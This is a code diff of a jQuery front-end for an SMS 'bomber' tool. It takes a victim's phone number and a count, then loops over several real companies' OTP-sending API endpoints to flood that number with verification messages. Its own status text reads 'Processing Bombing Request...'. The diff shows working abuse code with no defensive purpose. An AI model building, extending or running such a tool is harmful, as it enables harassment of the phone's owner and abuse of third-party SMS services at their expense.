@@ -3,18 +3,18 @@
 
 $(document).ready(() => {
 
-    $(document).on('click', '#send', function (e) {
+    $(document).on('click', '#send', function (e) {        
         e.preventDefault();
+        $('#logs').addClass('visually-hidden');
         var amount = $("#amount").val();
         var mobile = $("#mobile").val();
-        var url = "IgnoredHaxor_Team_X_1337";
         if (amount > 0 && mobile.length == 11) {
             var c = 0;
 
-            let APIS = [
+            const APIS = [
                 {
                     method: "POST",
-                    url: "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-" + mobile + "/operator-Robi/send",
+                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
                 },
                 {
                     method: 'POST',
@@ -30,12 +30,12 @@ $(document).ready(() => {
                     url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                 },
                 {
-                    url: `https://ss.binge.buzz/otp/send/login`,
-                    method: 'POST',
+                    url: "https://ss.binge.buzz/otp/send/login",
+                    method: "POST",
                     body: `phone=${mobile}`
                 }
 
-            ]
+            ];
 
             while (c < amount) {
                 APIS.forEach(API => {
@@ -44,12 +44,12 @@ $(document).ready(() => {
                 });
             }
             $('#logs').removeClass('visually-hidden');
-            $('#logs').text("Processing...");
+            $('#logs').text("Processing Bombing Request...");
 
 
         } else {
             $('#logs').removeClass('visually-hidden');
-            $('#logs').text("Invalid Number");
+            $('#logs').text("Invalid Number or Amount is null");
         }
     });
 })
